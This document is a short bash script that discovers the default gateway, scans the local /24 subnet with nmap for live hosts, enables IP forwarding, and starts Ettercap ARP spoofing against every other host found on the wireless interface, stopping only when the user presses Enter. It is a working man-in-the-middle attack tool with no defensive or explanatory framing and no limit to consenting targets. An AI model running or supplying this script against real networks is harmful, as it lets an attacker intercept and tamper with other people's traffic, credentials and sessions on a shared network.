#!/bin/bash

# Find the gateway's IP address
gateway_IP=$(ip route | awk '/default/ { print $3 }')

# Find the IP address of the current machine
current_IP=$(ip addr show | awk '/inet / && !/127.0.0.1/ {print $2}' | cut -d '/' -f 1)

echo "Gateway IP: $gateway_IP"  # Display the gateway IP

# Use nmap to discover live hosts in the network excluding the current machine's IP
targets_output=$(nmap -sn "$gateway_IP"/24 -oG - | awk '/Up$/ {print $2}')

# Exclude the gateway and current machine's IP from the targets
target_IPs=($(echo "$targets_output" | grep -vE "$gateway_IP|$current_IP" | sort -u))

if [ ${#target_IPs[@]} -eq 0 ]; then                                              echo "No other targets found on the network."
    exit 1
fi

echo "Target IPs:"  # Display the list of target IPs
for target in "${target_IPs[@]}"
do
    echo "$target"                                                            done

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start ARP spoofing using Ettercap for each target IP
for target in "${target_IPs[@]}"
do
    ettercap -Tq -i wlan0 -M arp:remote /"$gateway_IP"// /"$target"// &
done

# Wait for user input to stop ARP spoofing
read -p "Press Enter to stop ARP spoofing..." -r

# Disable IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward

# Kill Ettercap process
pkill ettercap
